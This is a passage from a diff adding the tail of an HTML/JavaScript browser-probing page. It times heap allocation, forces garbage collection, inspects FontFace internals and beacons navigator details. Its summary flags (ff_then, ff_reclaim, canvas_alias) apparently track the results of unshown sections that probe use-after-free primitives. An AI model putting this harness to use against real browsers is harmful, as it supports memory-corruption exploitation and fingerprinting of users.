+  try{
+    var t0=performance.now();
+    for(var i=0;i<5000;i++){var x=new ArrayBuffer(65536)}
+    var t1=performance.now();
+    B('S14-ALLOC','5000x64KB|time:'+(t1-t0).toFixed(1)+'ms');
+    log('info','[S14] 5000×64KB alloc: '+(t1-t0).toFixed(1)+'ms');
+  }catch(e){B('S14-ALLOC-ERR',e.message)}
+
+  // FinalizationRegistry callback timing
+  if(typeof FinalizationRegistry!=='undefined'){
+    try{
+      var finTimes=[];
+      var fr=new FinalizationRegistry(function(v){finTimes.push({v:v,t:performance.now()})});
+      var t2=performance.now();
+      for(var i=0;i<100;i++){
+        var obj={data:new ArrayBuffer(1024)};
+        fr.register(obj,'obj'+i);
+        obj=null;
+      }
+      // Force GC
+      for(var i=0;i<2000;i++){new ArrayBuffer(65536)}
+      await sl(200);
+      B('S14-FINREG','finalized:'+finTimes.length+'/100|elapsed:'+(performance.now()-t2).toFixed(0)+'ms');
+      log('info','[S14] FinReg: '+finTimes.length+'/100 finalized');
+    }catch(e){B('S14-FINREG-ERR',e.message)}
+  }
+
+  // ArrayBuffer max size
+  var maxSize=0;
+  var testSizes=[1024*1024,4*1024*1024,16*1024*1024,64*1024*1024,128*1024*1024,256*1024*1024];
+  for(var i=0;i<testSizes.length;i++){
+    try{var ab=new ArrayBuffer(testSizes[i]);maxSize=testSizes[i];ab=null}catch(e){break}
+  }
+  B('S14-MAXAB','maxSize:'+maxSize);
+  log('info','[S14] Max ArrayBuffer: '+(maxSize/1024/1024)+'MB');
+
+  prog();
+}
+
+// ================================================================
+// SECTION 15: OBJECT INTERNALS + HIDDEN PROPERTIES [BREAKTHROUGH: LOW]
+// ================================================================
+async function S15(){
+  log('warn','=== S15: OBJECT INTERNALS ===');
+
+  // Symbol.toPrimitive on native objects
+  try{
+    var testObjs=[
+      {name:'FontFace',obj:new FontFace('s15','local(Arial)')},
+      {name:'document.fonts',obj:document.fonts}
+    ];
+    for(var i=0;i<testObjs.length;i++){
+      var to=testObjs[i];
+      var hasSTP=typeof Symbol!=='undefined'&&to.obj[Symbol.toPrimitive];
+      var strVal=''+to.obj;
+      var numVal=+to.obj;
+      B('S15-PRIM',to.name+'|hasSTP:'+!!hasSTP+'|str:'+strVal.substring(0,80)+'|num:'+numVal);
+    }
+  }catch(e){B('S15-PRIM-ERR',e.message)}
+
+  // document.fonts prototype chain depth
+  try{
+    var chains=[
+      {name:'fonts',obj:document.fonts},
+      {name:'FontFace',obj:FontFace.prototype},
+      {name:'CSSFontFaceRule',obj:document.createElement('style')}
+    ];
+    for(var i=0;i<chains.length;i++){
+      var chain=[];
+      var p=chains[i].obj;
+      while(p&&chain.length<10){
+        var name=p.constructor?p.constructor.name:'?';
+        var ownKeys=Object.getOwnPropertyNames(p);
+        chain.push(name+'('+ownKeys.length+')');
+        p=Object.getPrototypeOf(p);
+      }
+      B('S15-CHAIN',chains[i].name+'|'+chain.join('->'));
+    }
+  }catch(e){B('S15-CHAIN-ERR',e.message)}
+
+  // CSS.supports for feature detection
+  if(typeof CSS!=='undefined'&&CSS.supports){
+    var cssTests=[
+      'display: grid','display: flex','backdrop-filter: blur(10px)',
+      'container-type: inline-size','color-scheme: dark light',
+      'font-palette: dark','view-transition-name: hero'
+    ];
+    var cssResults=[];
+    for(var i=0;i<cssTests.length;i++){
+      var parts=cssTests[i].split(': ');
+      try{cssResults.push(cssTests[i]+':'+(CSS.supports(parts[0],parts[1])?'Y':'N'))}catch(e){}
+    }
+    B('S15-CSS',cssResults.join('|'));
+    log('info','[S15] CSS: '+cssResults.join(', '));
+  }
+
+  // Navigator details
+  try{
+    B('S15-NAV','ua:'+navigator.userAgent+'|lang:'+navigator.language+'|hw:'+navigator.hardwareConcurrency+'|mem:'+(navigator.deviceMemory||'?'));
+  }catch(e){}
+
+  log('info','[S15] Object internals captured');
+  prog();
+}
+
+// ================================================================
+// MAIN — RUN ALL SECTIONS
+// ================================================================
+async function run(){
+  var ua=navigator.userAgent.substring(0,80);
+  B('BOOT','run:'+RUN_ID+'|ua:'+ua);
+  log('ok','=== P1095 MEGA BROWSER COMPARISON ===');
+  log('info','Run ID: '+RUN_ID+' | '+ua);
+  log('info','15 sections, ranked by breakthrough potential');
+  log('ok','');
+
+  var feat=await S1();await sl(50);
+  var s2=await S2();await sl(50);
+  var s3=await S3(s2);await sl(50);
+  var s4=await S4();await sl(50);
+  await S5(s4);await sl(50);
+  await S6(s4);await sl(50);
+  await S7();await sl(50);
+  await S8();await sl(50);
+  await S9();await sl(50);
+  await S10(s4);await sl(50);
+  await S11();await sl(50);
+  await S12();await sl(50);
+  await S13();await sl(50);
+  await S14();await sl(50);
+  await S15();
+
+  // Final summary beacon
+  var summary={
+    run:RUN_ID,
+    ff_then:s2.triggered,
+    ff_method:s2.method,
+    ff_reclaim:!!s3,
+    canvas_alias:!!s4,
+    bigint:feat.BigUint64Array,
+    weakref:feat.WeakRef,
+    finreg:feat.FinalizationRegistry,
+    worker:feat.Worker,
+    wasm:feat.WebAssembly
+  };
+  B('ALL-DONE',Object.keys(summary).map(function(k){return k+':'+summary[k]}).join('|'));
+
+  log('ok','');
+  log('ok','=== P1095 COMPLETE — RUN '+RUN_ID+' ===');
+  log('ok','Copy this run ID for comparison: '+RUN_ID);
+}
+
+run();
+</script>
+</body>
+</html>
